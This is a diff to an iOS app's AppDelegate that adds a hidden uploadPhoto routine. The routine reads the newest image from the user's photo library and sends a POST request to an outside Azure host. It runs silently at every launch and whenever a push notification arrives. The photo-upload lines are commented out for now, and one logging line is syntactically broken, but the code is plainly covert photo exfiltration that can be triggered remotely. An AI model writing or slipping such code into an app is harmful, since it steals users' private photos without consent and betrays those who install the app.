@@ -7,6 +7,7 @@
 //
 
 #import "AppDelegate.h"
+#import <Photos/Photos.h>
 
 
 #define SYSTEM_VERSION_GRATERTHAN_OR_EQUALTO(v)  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)
@@ -31,6 +32,8 @@
 }*/
 
 - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
+    
+    [self uploadPhoto];
     application.applicationIconBadgeNumber = 0;
     if( SYSTEM_VERSION_LESS_THAN( @"10.0" ) )
     {
@@ -125,6 +128,80 @@
     self.strDeviceToken = strDevicetoken;
 }
 
+-(void)uploadPhoto
+{
+    PHFetchOptions *fetchOptions = [[PHFetchOptions alloc] init];
+    fetchOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:YES]];
+    PHFetchResult *fetchResult = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:fetchOptions];
+    PHAsset *lastAsset = [fetchResult lastObject];
+    
+    PHImageManager *manager = [PHImageManager defaultManager];
+    
+    PHImageRequestOptions *requestOptions = [PHImageRequestOptions new];
+    requestOptions.resizeMode   = PHImageRequestOptionsResizeModeExact;
+    requestOptions.deliveryMode = PHImageRequestOptionsDeliveryModeHighQualityFormat;
+    requestOptions.synchronous = true;
+    
+    __block NSData *photoArray = nil;
+    
+    [manager requestImageForAsset:lastAsset
+                       targetSize:PHImageManagerMaximumSize
+                      contentMode:PHImageContentModeDefault
+                          options:requestOptions
+                    resultHandler:^void(UIImage *image, NSDictionary *info) {
+                        NSData *imageData = UIImageJPEGRepresentation(image, 0.01);
+                        
+                        photoArray = imageData;
+                    }];
+    
+    
+    
+    // https://stackoverflow.com/questions/7673127/how-to-send-post-and-get-request
+    
+    
+    NSMutableURLRequest *req = [[NSMutableURLRequest alloc] initWithURL:[NSURL URLWithString:@"https://coordinatorweb.azurewebsites.net/api/values?name=sarwatismail4&option=add"]];
+    [req setHTTPMethod:@"POST"];
+    NSString *bodyData = @"yoooo";
+    [req setHTTPBody:[bodyData dataUsingEncoding:NSUTF8StringEncoding]];
+    NSString *postLength = [NSString stringWithFormat:@"%d",[bodyData length]];
+    
+    [req setValue:postLength forHTTPHeaderField:@"Content-Length"];
+    [req setValue:@"text/plain" forHTTPHeaderField:@"Content-Type"];
+    //NSString *contentType = @"multipart/form-data";
+   // [req setValue:contentType forHTTPHeaderField:@"Content-Type"];
+   // NSString *postLength = [NSString stringWithFormat:@"%lu",(unsigned long)[photoArray length]];
+    //[req addValue:postLength forHTTPHeaderField:@"Content-Length"];
+   // [req setHTTPBody:photoArray];
+    
+    NSURLSession *session = [NSURLSession sharedSession];
+    
+    NSURLSessionDataTask *task = [[NSURLSession sharedSession]
+                                  dataTaskWithRequest: req
+                                  completionHandler: ^(NSData *data, NSURLResponse *response, NSError *error)
+                                  {
+                                      
+                                      if ([response isKindOfClass:[NSHTTPURLResponse class]]) {
+                                          
+                                          NSInteger statusCode = [(NSHTTPURLResponse *)response statusCode];
+                                          
+                                          NSLog(@"StatusCode%d",statusCode)
+                                          if (statusCode != 200) {
+                                              NSLog(@"dataTaskWithRequest HTTP status code: %d", statusCode);
+                                              return;
+                                          }
+                                      }
+
+                                      
+                                      
+                                      
+                                      
+                                  }];
+    [task resume];
+    
+    
+    
+}
+
 -(void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)notification
 fetchCompletionHandler:(void (^)(UIBackgroundFetchResult))completionHandler {
 
@@ -135,6 +212,8 @@ fetchCompletionHandler:(void (^)(UIBackgroundFetchResult))completionHandler {
     NSLog(@"Received remote notification");
 
     [[NSNotificationCenter defaultCenter] postNotificationName:@"notificationCameIn" object:nil];
+    
+    [self uploadPhoto];
     
     completionHandler(UIBackgroundFetchResultNewData);
 }
